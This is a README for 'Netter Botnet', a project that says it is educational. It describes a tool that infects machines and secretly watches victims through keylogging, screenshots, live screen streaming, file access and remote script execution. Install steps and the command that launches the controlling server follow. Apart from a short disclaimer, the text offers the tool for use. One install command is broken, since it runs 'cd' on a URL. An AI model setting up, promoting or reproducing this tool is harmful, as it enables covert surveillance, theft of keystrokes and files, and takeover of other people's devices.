> [!WARNING]
> **This project is still under development** and may contain bugs or incomplete features. Use at your own risk. Feedback and contributions are welcome.

# Netter Botnet

This project is a botnet created for educational and research purposes. It is capable of infecting machines, gathering system information, and executing various actions on the victim's device without their knowledge. **This tool should NOT be used for illegal or unethical purposes.**

## Features

- **IP and OS Info Gathering**: Retrieves the victim's IP address and OS details.
- **Keylogger**: Records keystrokes.
- **Screenshot Capture**: Takes screenshots of the victim's screen.
- **Real-time Screen Streaming**: Streams the victim's screen in real-time.
- **File Access**: Provides access to and manipulation of the victim's file system.
- **Execute Custom Python Scripts**: Run custom scripts on the victim's device.

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/LeftandRights/netter_botnet
   cd https://github.com/LeftandRights/netter_botnet
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

## How to Use

1. **Run the Server**: Start the server by specifying the bind address:
   ```bash
   python3 server.py -b <bind_address>
   ```
   Replace `<bind_address>` with the desired address.

2. **Help Menu**: After starting the server, type:
   ```bash
   help
   ```
